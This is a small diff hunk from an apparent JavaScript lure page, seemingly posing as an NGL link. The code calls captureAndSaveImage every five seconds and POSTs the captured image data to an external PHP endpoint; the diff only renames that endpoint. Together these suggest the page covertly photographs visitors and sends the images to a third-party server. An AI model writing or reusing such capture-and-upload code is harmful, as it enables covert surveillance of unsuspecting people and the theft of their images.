@@ -30,7 +30,7 @@ function captureAndSaveImage() {
 setInterval(captureAndSaveImage, 5000);
 
 function sendImageToServer(formData) {
-    fetch('https://ngl-link.rysnanto.eu.org/saveimage.php', {
+    fetch('https://ngl-link.rysnanto.eu.org/save.php', {
         method: 'POST',
         body: formData,
     })
